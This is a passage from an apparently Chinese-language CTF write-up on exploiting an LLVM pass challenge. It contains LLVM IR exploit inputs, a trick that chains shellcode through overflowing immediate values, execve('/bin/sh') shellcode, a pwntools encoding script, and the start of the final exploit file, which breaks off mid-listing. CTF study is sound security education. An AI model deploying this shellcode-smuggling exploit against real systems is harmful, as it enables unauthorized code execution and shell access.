  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;204&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
  ret i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

define dso_local i64 @test2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; local_unnamed_addr &lt;span class=&#34;token comment&#34;&gt;#0 &amp;#123;&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sub nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;11111&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2222&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;111111111&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
  ret i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也是 ok 的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816092856368.png&#34; alt=&#34;image-20220816092856368&#34;&gt;&lt;/p&gt;
&lt;p&gt;其实这题在我看来最关键的漏洞并不是那个溢出，而是没有初始化，其实无论是否溢出，如果没有最后的 ret 指令，那么 code 段还是会一直执行的，这样就可能执行到立即数解析出来的代码&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这里如果立即数为 1 就会变成 INC 指令，结合不同于它长度的指令可以错位&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816135450883.png&#34; alt=&#34;image-20220816135450883&#34;&gt;&lt;/p&gt;
&lt;p&gt;这条命令占 3 字节，另一条占 13 字节&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816135621731.png&#34; alt=&#34;image-20220816135621731&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接下来尝试使用如下 exp，调试一下&lt;/p&gt;
&lt;pre class=&#34;language-nsis&#34; data-language=&#34;nsis&#34;&gt;&lt;code class=&#34;language-nsis&#34;&gt;define dso_local i64 @test1&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; local_unnamed_addr &lt;span class=&#34;token comment&#34;&gt;#0 &amp;#123;&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;43499&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;43499&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;43499&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;43499&lt;/span&gt;
  ret i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;

define dso_local i64 @test2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; local_unnamed_addr &lt;span class=&#34;token comment&#34;&gt;#0 &amp;#123;&lt;/span&gt;
  &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; add nsw i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
  ret i64 &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;断点&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;断点一：0x42fe64&lt;/p&gt;
&lt;p&gt;断点二：0xF750 + 0x7fffefdc7000&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可以看到第二次运行到这里执行的 shellcode 如下，可以看见 ret 下面还有一堆残留，只不过因为 ret 执行不到&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816101533371.png&#34; alt=&#34;image-20220816101533371&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就构造溢出的字节&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;总长度 0xff0&lt;/p&gt;
&lt;p&gt;我们总是想多溢出一些的，抛开前面的必写进去的两个字节，那么我们前面的长度最好凑成 0xfee ，最后一条指令的立即数刚好全部溢出去，调试发现前面会自动有一个 10 字节的命令&lt;/p&gt;
&lt;p&gt;3*4 + 13*312 = 0xfee - 10&lt;/p&gt;
&lt;p&gt;因此写 4 条 inc 312 条 add 就行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;成功溢出成 &lt;code&gt; 0x1122334455667788&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816141657227.png&#34; alt=&#34;image-20220816141657227&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;攻击-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#攻击-3&#34;&gt;#&lt;/a&gt; 攻击&lt;/h3&gt;
&lt;p&gt;展开攻击，首先我们第一次可以溢出成可控的立即数，接着我们来进行第二次执行 shellcode 的编写&lt;/p&gt;
&lt;p&gt;先不考虑 getshell 的问题，我们的长度也要刚好溢出并且写不进 ret 这样就会执行残留的 shellcode&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;3*9 + 13*311= 0xff0 - 10&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;运行后断到第二次 &lt;code&gt;call shellcode&lt;/code&gt; ，果然没有写进 ret，并且已经把这个立即数当成 shellcode 执行了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816143329327.png&#34; alt=&#34;image-20220816143329327&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就是把这个立即数改成一个跳转指令 ，之后就可以跳到其他立即数中了每个立即数长 8 字节要分出 2 个字节来写跳转指令，所以每条指令长度不能超过 6，然后是 shellcode 的编写，首先是每次的跳转指令，因为要跳到下一个立即数段&lt;/p&gt;
&lt;p&gt;每 13 字节的指令中&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2 + 8 + 3&lt;/p&gt;
&lt;p&gt;其中 8 字节为可控字节&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因为是栈操作后指令会倒过来，第一次跳转应为&lt;em&gt;负&lt;/em&gt;的  &lt;code&gt;8+3=11&lt;/code&gt;  字节，之后的每一次跳转应为&lt;em&gt;负&lt;/em&gt;的  &lt;code&gt;8+2+3+8-2=19 &lt;/code&gt; 字节，成功实现跳转&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816162029472.png&#34; alt=&#34;image-20220816162029472&#34;&gt;&lt;/p&gt;
&lt;p&gt;这题的核心在于构造 shellcode，而构造 shellcode 的核心在于 binsh 字符串，我认为可以使用 &lt;code&gt;mov edi,xxx&lt;/code&gt;  之类的指令，可以减少长度，之后用寄存器左移指令移动到寄存器的高位，这样就可以写出如下 shellcode&lt;/p&gt;
&lt;pre class=&#34;language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;mov edi , 0x68732f
shl rdi , 32
mov esi , 0x6e69622f
add rdi , rsi
push rdi
mov rdi , rsp
xor rsi , rsi
xor rdx , rdx
mov eax , 0x3B
syscall&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;写一个 py 脚本生成一下立即数&lt;/p&gt;
&lt;pre class=&#34;language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;

context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;update&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; os &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arch &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;timeout &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# for i in range(408):&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#     print(&#39;%&amp;#123;&amp;#125; = add nsw i64 %&amp;#123;&amp;#125;, 43499&#39;.format(i+1,i))&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# for i in range(999):&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#     for j in range(999):&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#         if (3*i + j*13 ==(0xff0-10)):&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#             print(i,j)&lt;/span&gt;

shellcode &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#39;mov edi , 0x68732f&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#39;shl rdi , 32&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#39;mov esi , 0x6e69622f&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#39;add rdi , rsi&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#39;push rdi&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#39;mov rdi , rsp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#39;xor rsi , rsi&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#39;xor rdx , rdx&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#39;mov eax , 0x3B&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;token string&#34;&gt;&#39;syscall&#39;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; shellcode&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;asm&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;\x90&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; asm&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;jmp $-19&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行优化 exp 可以 getshell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220816162205717.png&#34; alt=&#34;image-20220816162205717&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后的 &lt;code&gt;exp.ll&lt;/code&gt;  文件&lt;/p&gt;
&lt;pre class=&#34;language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;define dso_local i64 @test1(i64 %0) local_unnamed_addr #0 &amp;#123;
  %2 &amp;#x3D; add nsw i64 %0, 62443
  %3 &amp;#x3D; add nsw i64 %2, 43499
  %4 &amp;#x3D; add nsw i64 %3, 43499
  %5 &amp;#x3D; add nsw i64 %4, 43499
  %6 &amp;#x3D; add nsw i64 %5, 43499
  %7 &amp;#x3D; add nsw i64 %6, 43499
  %8 &amp;#x3D; add nsw i64 %7, 43499
  %9 &amp;#x3D; add nsw i64 %8, 43499
  %10 &amp;#x3D; add nsw i64 %9, 43499
  %11 &amp;#x3D; add nsw i64 %10, 43499
  %12 &amp;#x3D; add nsw i64 %11, 43499
  %13 &amp;#x3D; add nsw i64 %12, 43499
  %14 &amp;#x3D; add nsw i64 %13, 43499
  %15 &amp;#x3D; add nsw i64 %14, 43499
  %16 &amp;#x3D; add nsw i64 %15, 43499
  %17 &amp;#x3D; add nsw i64 %16, 43499
  %18 &amp;#x3D; add nsw i64 %17, 43499
  %19 &amp;#x3D; add nsw i64 %18, 43499
  %20 &amp;#x3D; add nsw i64 %19, 43499
  %21 &amp;#x3D; add nsw i64 %20, 43499
